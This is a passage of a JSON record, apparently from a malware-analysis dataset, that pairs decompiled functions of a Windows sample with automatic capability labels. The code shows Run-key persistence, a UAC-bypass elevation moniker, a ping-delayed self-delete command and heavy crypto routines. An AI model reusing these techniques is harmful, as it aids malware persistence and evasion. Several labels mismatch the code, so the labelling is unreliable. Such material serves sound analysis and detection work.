 uVar6 = (arg_ch[7] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 8;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[8] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[8] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 9;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[9] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[9] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 10;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[10] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[10] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 0xb;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[0xb] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xb] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 0xc;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[0xc] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xc] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 0xd;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[0xd] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xd] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 0xe;\n            *puVar1 = uVar5 + *puVar1;\n            puVar1 = arg_ch + 0xf;\n            uVar4 = arg_ch[0xe] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[0xe] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar3 = arg_10h + 0xf;\n            *puVar2 = uVar5 + *puVar2;\n            arg_ch = arg_ch + 0x10;\n            uVar4 = *puVar1 * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            var_4h = (*puVar1 * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar3);\n            arg_10h = arg_10h + 0x10;\n            *puVar3 = uVar5 + *puVar3;\n            arg_8h = arg_8h - 0x10;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    if (7 < arg_8h) {\n        var_8h = arg_8h >> 3;\n        do {\n            uVar4 = *arg_ch * arg_14h;\n            uVar5 = uVar4 + var_4h;\n            uVar6 = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n            puVar1 = arg_10h + 1;\n            *arg_10h = uVar5 + *arg_10h;\n            uVar4 = arg_ch[1] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[1] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 2;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[2] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[2] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 3;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[3] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[3] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 4;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[4] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[4] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 5;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[5] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[5] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 6;\n            *puVar1 = uVar5 + *puVar1;\n            puVar1 = arg_ch + 7;\n            uVar4 = arg_ch[6] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[6] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar3 = arg_10h + 7;\n            *puVar2 = uVar5 + *puVar2;\n            arg_ch = arg_ch + 8;\n            uVar4 = *puVar1 * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            var_4h = (*puVar1 * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar3);\n            arg_10h = arg_10h + 8;\n            *puVar3 = uVar5 + *puVar3;\n            arg_8h = arg_8h - 8;\n            var_8h = var_8h - 1;\n        } while (var_8h != 0);\n    }\n    for (; arg_8h != 0; arg_8h = arg_8h - 1) {\n        uVar4 = *arg_ch * arg_14h;\n        uVar5 = uVar4 + var_4h;\n        var_4h = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n        *arg_10h = uVar5 + *arg_10h;\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + 1;\n    }\n    do {\n        *arg_10h = *arg_10h + var_4h;\n        var_4h = *arg_10h < var_4h;\n        arg_10h = arg_10h + 1;\n    } while (var_4h != 0);\n    return;\n}\n",
        "token_count": 3031
    },
    "004100c0": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004100c0(uint32_t *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        uVar3 = *arg_8h & 0x3f;\n        uVar1 = *arg_8h + arg_10h;\n        uVar2 = 0x40 - uVar3;\n        *arg_8h = uVar1;\n        if (uVar1 < arg_10h) {\n            arg_8h[1] = arg_8h[1] + 1;\n        }\n        uVar1 = arg_10h;\n        if ((uVar3 != 0) && (uVar2 <= arg_10h)) {\n            fcn.004013a0(arg_8h + uVar3 + 0x28, arg_ch, uVar2);\n            uVar3 = fcn.0040f430(arg_8h, arg_8h + 10);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            arg_ch = arg_ch + uVar2;\n            uVar1 = arg_10h - uVar2;\n        }\n        for (; arg_10h = uVar3,  0x3f < uVar1; uVar1 = uVar1 - 0x40) {\n            uVar3 = fcn.0040f430(arg_8h, arg_ch);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            arg_ch = arg_ch + 0x40;\n            uVar3 = arg_10h;\n        }\n        if (uVar1 != 0) {\n            fcn.004013a0(arg_10h + 0x28 + arg_8h, arg_ch, uVar1);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 457
    },
    "00406820": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406820(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_18h;\n    uint32_t uVar3;\n    uint var_3cch;\n    uint var_1c8h;\n    uint var_88h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    fcn.0040bb10(&var_18h);\n    fcn.0040bb10(&var_24h);\n    fcn.0040de00(0x415720, 0, 0);\n    iVar1 = fcn.0040c710(&var_18h, 0x415000, 0x100);\n    if (((iVar1 == 0) && (iVar1 = fcn.0040c710(&var_24h, 0x415100, 3),  iVar1 == 0)) &&\n       (iVar1 = fcn.0040dd50(0x415720, &var_18h, 0, 0, 0, &var_24h),  iVar1 == 0)) {\n        fcn.0040eca0(&var_1c8h);\n        fcn.0040e940(&var_3cch);\n        fcn.00407120(&var_88h, 100);\n        iVar1 = fcn.0040eea0(&var_1c8h, fcn.0040e810, &var_3cch, &var_88h, 100);\n        if (iVar1 == 0) {\n            uVar3 = 0;\n            arg_18h = 0xf5;\n            var_4h = *arg_ch;\n            var_8h = 0;\n            if (var_4h / 0xf5 != -1) {\n                do {\n                    iVar1 = fcn.0040de30(0x415720, fcn.0040ecc0, &var_1c8h, 0, arg_18h, arg_8h, uVar3 + 0x4157d8);\n                    if (iVar1 != 0) goto code_r0x004069ac;\n                    uVar2 = var_4h;\n                    if (0xf4 < var_4h) {\n                        uVar2 = arg_18h;\n                    }\n                    var_4h = var_4h - 0xf5;\n                    var_8h = var_8h + 1;\n                    arg_8h = arg_8h + 0xf5;\n                    uVar3 = uVar3 + 0x100;\n                    arg_18h = uVar2;\n                } while (var_8h != *arg_ch / 0xf5 + 1);\n            }\n            var_ch = 1;\n            *arg_ch = uVar3;\n        }\n    }\ncode_r0x004069ac:\n    fcn.0040b400(&var_18h);\n    fcn.0040b400(&var_24h);\n    fcn.0040d9d0(0x415720);\n    fcn.0040ec70(&var_1c8h);\n    fcn.0040e7d0(&var_3cch);\n    return var_ch;\n}\n",
        "token_count": 767
    },
    "004077d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004077d0(uint lpString, uint riid, int32_t arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint lpString1;\n    uint pBindOptions;\n    int32_t var_50h;\n    uint lpString2;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint ppv;\n    \n    ppv = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n    if (iVar1 < 0x41) {\n        iVar1 = 0x24;\n        puVar2 = &pBindOptions;\n        do {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n        pBindOptions = 0x24;\n        var_50h = 4;\n        if (arg_10h != 0) {\n            var_50h = arg_10h;\n        }\n        lpString2 = 0x6c0045;\n        var_8h._0_2_ = 0;\n        var_3ch = 0x760065;\n        var_38h = 0x740061;\n        var_34h = 0x6f0069;\n        var_30h = 0x3a006e;\n        var_2ch = 0x640041;\n        var_28h = 0x69006d;\n        var_24h = 0x69006e;\n        var_20h = 0x740073;\n        var_1ch = 0x610072;\n        var_18h = 0x6f0074;\n        var_14h = 0x210072;\n        var_10h = 0x65006e;\n        var_ch = 0x3a0077;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, &lpString2);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, lpString);\n        uVar3 = (*_sym.imp.ole32.dll_CoGetObject)(&lpString1, &pBindOptions, riid, &ppv);\n        *arg_14h = ppv;\n        return uVar3;\n    }\n    *arg_14h = ppv;\n    return 0x80004005;\n}\n",
        "token_count": 647
    },
    "0040d2a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d2a0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_01;\n    int32_t *arg_10h_00;\n    int32_t *piVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(arg_18h + 4) < *(arg_10h + 4) + 1U) || (*(arg_18h + 8) == 0)) {\n        return 0xfffffffc;\n    }\n    fcn.00401000(*(arg_18h + 8), 0, *(arg_18h + 4) * 4);\n    arg_8h_00 = *(arg_10h + 4);\n    piVar4 = *(arg_18h + 8);\n    arg_8h_01 = *(arg_ch + 4);\n    if (arg_8h_00 <= *(arg_ch + 4)) {\n        arg_8h_01 = arg_8h_00;\n    }\n    var_4h = 0;\n    arg_10h_00 = piVar4;\n    if (arg_8h_00 != 0) {\n        do {\n            iVar3 = *(*(arg_8h + 8) + var_4h * 4);\n            iVar1 = **(arg_ch + 8);\n            iVar2 = *arg_10h_00;\n            fcn.0040d400(arg_8h_01, *(arg_ch + 8), arg_10h_00, iVar3);\n            fcn.0040d400(arg_8h_00, *(arg_10h + 8), arg_10h_00, (iVar1 * iVar3 + iVar2) * arg_14h);\n            var_4h = var_4h + 1;\n            *arg_10h_00 = iVar3;\n            piVar4 = arg_10h_00 + 1;\n            arg_10h_00[arg_8h_00 + 2] = 0;\n            arg_10h_00 = piVar4;\n        } while (var_4h < arg_8h_00);\n    }\n    fcn.004013a0(*(arg_8h + 8), piVar4, arg_8h_00 * 4 + 4);\n    iVar3 = fcn.0040a3d0(arg_8h, arg_10h);\n    if (iVar3 < 0) {\n        fcn.0040d670(arg_8h_00, *(arg_8h + 8), *(arg_18h + 8));\n        return 0;\n    }\n    fcn.0040d670(arg_8h_00, *(arg_10h + 8), *(arg_8h + 8));\n    return 0;\n}\n",
        "token_count": 704
    },
    "0040d670": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d670(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    uVar3 = 0;\n    if (arg_8h != 0) {\n        arg_ch = arg_ch - arg_10h;\n        do {\n            uVar1 = *arg_10h;\n            uVar4 = uVar1 - uVar3;\n            *arg_10h = uVar4;\n            uVar2 = *(arg_ch + arg_10h);\n            *arg_10h = uVar4 - uVar2;\n            uVar3 = (uVar1 < uVar3) + (uVar4 < uVar2);\n            arg_10h = arg_10h + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n        if (uVar3 != 0) {\n            do {\n                uVar1 = *arg_10h;\n                *arg_10h = uVar1 - uVar3;\n                bVar5 = uVar1 < uVar3;\n                uVar3 = uVar1 < uVar3;\n                arg_10h = arg_10h + 1;\n            } while (bVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "0040e450": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e450(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    uint arg_10h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    \n    uVar1 = *(arg_8h + 4);\n    arg_8h_00 = arg_8h + 8;\n    uVar2 = fcn.0040ca50(arg_8h_00);\n    if ((uVar1 == uVar2) && (uVar1 < 0x401)) {\n        iVar3 = fcn.0040a470(arg_8h_00, 0);\n        if (0 < iVar3) {\n            iVar3 = fcn.0040ba70(arg_8h_00, 0);\n            if (iVar3 != 0) {\n                iVar3 = fcn.0040a470(arg_8h + 0x14, 0);\n                if (0 < iVar3) {\n                    fcn.0040bb10(&var_ch);\n                    iVar3 = fcn.0040c710(&var_ch, arg_ch, *(arg_8h + 4));\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.0040a4b0(&var_ch, arg_8h_00);\n                        if (iVar3 < 0) {\n                            arg_10h_00 = *(arg_8h + 4);\n                            iVar3 = fcn.0040ac10(&var_ch, &var_ch, arg_8h + 0x14, arg_8h_00, arg_8h + 0x68);\n                            if (iVar3 == 0) {\n                                iVar3 = fcn.0040cc20(&var_ch, arg_10h, arg_10h_00);\n                            }\n                        }\n                        else {\n                            iVar3 = -4;\n                        }\n                    }\n                    fcn.0040b400(&var_ch);\n                    if (iVar3 != 0) {\n                        return iVar3 + -0x4280;\n                    }\n                    return 0;\n                }\n            }\n        }\n    }\n    return -0x4080;\n}\n",
        "token_count": 505
    },
    "0040e810": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040e810(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t *puVar6;\n    uint var_20h;\n    uint var_10h;\n    \n    iVar4 = 0;\n    if (0x20 < arg_10h) {\n        return -0x3c;\n    }\n    do {\n        if (0x100 < iVar4) {\n            iVar3 = -0x3c;\n            goto code_r0x0040e91a;\n        }\n        iVar3 = fcn.0040e660(arg_8h);\n        if (iVar3 != 0) goto code_r0x0040e91a;\n        iVar3 = *(arg_8h + 0x70);\n        if (iVar3 < 1) break;\n        puVar6 = arg_8h + 0x7c;\n        bVar2 = true;\n        do {\n            bVar1 = false;\n            if (puVar6[1] <= *puVar6) {\n                bVar1 = bVar2;\n            }\n            iVar3 = iVar3 + -1;\n            puVar6 = puVar6 + 5;\n            bVar2 = bVar1;\n        } while (iVar3 != 0);\n        iVar4 = iVar4 + 1;\n    } while (!bVar1);\n    iVar4 = arg_8h + 4;\n    _var_20h = ZEXT816(0);\n    _var_10h = ZEXT816(0);\n    iVar3 = fcn.0040fd80(iVar4, &var_20h);\n    if (iVar3 == 0) {\n        fcn.0040ff40(iVar4);\n        fcn.0040ff60(iVar4);\n        iVar3 = fcn.0040fff0(iVar4, 0);\n        if (((iVar3 == 0) && (iVar3 = fcn.004100c0(iVar4, &var_20h, 0x20),  iVar3 == 0)) &&\n           (iVar3 = fcn.0040ff80(&var_20h, 0x20, &var_20h, 0),  iVar3 == 0)) {\n            if (0 < *(arg_8h + 0x70)) {\n                puVar5 = arg_8h + 0x7c;\n                do {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 5;\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < *(arg_8h + 0x70));\n            }\n            fcn.004013a0(arg_ch, &var_20h, arg_10h);\n            iVar3 = 0;\n        }\n    }\ncode_r0x0040e91a:\n    fcn.0040ef10(&var_20h, 0x20);\n    return iVar3;\n}\n",
        "token_count": 700
    },
    "0040edb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_180h\n\nint32_t __cdecl fcn.0040edb0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint var_180h;\n    uint in_stack_fffffe80;\n    uint in_stack_fffffe84;\n    uint in_stack_fffffe88;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint in_stack_fffffeb8;\n    uint in_stack_fffffebc;\n    uint in_stack_fffffec0;\n    uint in_stack_fffffec4;\n    uint in_stack_fffffec8;\n    uint in_stack_fffffecc;\n    uint in_stack_fffffed0;\n    uint in_stack_fffffed4;\n    uint in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    \n    uVar1 = *(arg_8h + 0x18);\n    if ((uVar1 < 0x181) && (arg_10h <= 0x180 - uVar1)) {\n        fcn.00401000(&var_180h, 0, 0x180);\n        iVar2 = (**(arg_8h + 0x138))(*(arg_8h + 0x13c), &var_180h, uVar1);\n        if (iVar2 != 0) {\n            return -0x34;\n        }\n        iVar2 = *(arg_8h + 0x18);\n        if ((arg_ch != 0) && (arg_10h != 0)) {\n            fcn.004013a0(&var_180h + iVar2, arg_ch, arg_10h);\n            iVar2 = iVar2 + arg_10h;\n        }\n        iVar2 = fcn.0040e9b0(&var_180h, &var_180h, iVar2, unaff_EDI, unaff_ESI, unaff_EBX, var_180h, in_stack_fffffe80, \n                             in_stack_fffffe84, in_stack_fffffe88, in_stack_fffffe8c, in_stack_fffffe90, \n                             in_stack_fffffe94, in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, \n                             in_stack_fffffea4, in_stack_fffffea8, in_stack_fffffeac, in_stack_fffffeb0, \n                             in_stack_fffffeb4, in_stack_fffffeb8, in_stack_fffffebc, in_stack_fffffec0, \n                             in_stack_fffffec4, in_stack_fffffec8, in_stack_fffffecc, in_stack_fffffed0, \n                             in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040eba0(arg_8h, &var_180h);\n            if (iVar2 == 0) {\n                *(arg_8h + 0x10) = 1;\n            }\n        }\n        fcn.0040ef10(&var_180h, 0x180);\n        return iVar2;\n    }\n    return -0x38;\n}\n",
        "token_count": 837
    },
    "00404ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00404ef0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpString1;\n    uint var_49ch;\n    uint lpString2;\n    uint var_8ch;\n    uint var_88h;\n    uint lpSubKey;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint ARG_1;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    var_88h = 1;\n    lpSubKey = 0x4f0053;\n    var_80h = 0x540046;\n    var_7ch = 0x410057;\n    var_78h = 0x450052;\n    var_74h = 0x4d005c;\n    var_70h = 0x630069;\n    var_6ch = 0x6f0072;\n    var_68h = 0x6f0073;\n    var_64h = 0x740066;\n    var_60h = 0x57005c;\n    var_5ch = 0x6e0069;\n    var_58h = 0x6f0064;\n    var_54h = 0x730077;\n    var_50h = 0x43005c;\n    var_4ch = 0x720075;\n    var_48h = 0x650072;\n    var_44h = 0x74006e;\n    var_40h = 0x650056;\n    var_3ch = 0x730072;\n    var_38h = 0x6f0069;\n    var_34h = 0x5c006e;\n    var_30h = 0x750052;\n    var_2ch = 0x6e;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, &lpSubKey, 0, 0, 0, 0x2001f, 0, &hKey, &var_8ch);\n    if (iVar1 != 0) {\n        return false;\n    }\n    lpValueName = 0x4f0058;\n    var_18h = 0x580031;\n    var_14h = 0x440041;\n    var_10h = 0x4f0070;\n    var_ch = 0x310030;\n    var_8h._0_2_ = 0;\n    if (arg_8h == 0) {\n        (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &var_49ch, 0x104);\n        arg_8h = 0x104;\n        var_20h._0_2_ = 0;\n        ARG_1 = 0x250022;\n        var_24h = 0x220053;\n        iVar1 = (*_sym.imp.USER32.dll_wsprintfW)(&lpString2, &ARG_1, &var_49ch);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &var_88h, &lpString1, &arg_8h);\n        if ((iVar2 != 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, &lpString2),  iVar2 != 0)) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, &lpValueName, 0, 1, &lpString2, iVar1 * 2);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar2 == 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return true;\n}\n",
        "token_count": 1081
    },
    "00405a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00405a80(void)\n\n{\n    uint ARG_0;\n    uint var_2b0h;\n    uint pExecInfo;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint *var_98h;\n    uint *var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint ARG_1;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &var_2b0h, 0x104);\n    ARG_1 = 0x2f0020;\n    var_68h = 0x200043;\n    var_64h = 0x690070;\n    var_60h = 0x67006e;\n    var_5ch = 0x310020;\n    var_58h = 0x31002e;\n    var_54h = 0x31002e;\n    var_50h = 0x31002e;\n    var_4ch = 0x2d0020;\n    var_48h = 0x20006e;\n    var_44h = 0x300032;\n    var_40h = 0x3e0020;\n    var_3ch = 0x4e0020;\n    var_38h = 0x6c0075;\n    var_34h = 0x260020;\n    var_30h = 0x440020;\n    var_2ch = 0x6c0065;\n    var_28h = 0x2f0020;\n    var_24h = 0x200066;\n    var_20h = 0x71002f;\n    var_1ch = 0x220020;\n    var_18h = 0x730025;\n    var_14h = 0x22;\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &ARG_1, &var_2b0h);\n    var_98h = &var_10h;\n    var_10h = 0x6d0063;\n    var_94h = &ARG_0;\n    var_ch = 0x2e0064;\n    var_8h = 0x780065;\n    var_4h = 0x65;\n    pExecInfo = 0x3c;\n    var_a4h = 0x400;\n    var_a0h = 0;\n    var_9ch = 0;\n    var_90h = 0;\n    var_8ch = 0;\n    var_88h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    return;\n}\n",
        "token_count": 794
    },
    "00405d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405d80(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(*(*(arg_8h + 4) + 0xb0));\n    piVar1 = *(arg_8h + 4) + 0xb8;\n    *piVar1 = *piVar1 + 2;\n    return 0xffffffff;\n}\n",
        "token_count": 100
    },
    "004069f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004069f0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4b4h;\n    uint var_2b0h;\n    uint var_170h;\n    uint var_10ch;\n    uint var_60h;\n    uint var_54h;\n    uint var_48h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    \n    uVar2 = 0;\n    fcn.0040eca0(&var_2b0h);\n    fcn.0040de00(&var_10ch, 0, 0);\n    fcn.0040bb10(&var_ch);\n    fcn.0040bb10(&var_18h);\n    fcn.0040bb10(&var_24h);\n    fcn.0040bb10(&var_30h);\n    fcn.0040bb10(&var_3ch);\n    fcn.0040bb10(&var_48h);\n    fcn.0040bb10(&var_54h);\n    fcn.0040bb10(&var_60h);\n    fcn.00407120(&var_170h, 100);\n    fcn.0040e940(&var_4b4h);\n    iVar1 = fcn.0040eea0(&var_2b0h, fcn.0040e810, &var_4b4h, &var_170h, 100);\n    if (((((iVar1 == 0) && (iVar1 = fcn.0040da70(&var_10ch, fcn.0040ecc0, &var_2b0h, 0x800, 0x10001),  iVar1 == 0)) &&\n         (iVar1 = fcn.0040d800(&var_10ch, &var_ch, &var_18h, &var_24h, &var_30h, &var_3ch),  iVar1 == 0)) &&\n        ((((iVar1 = 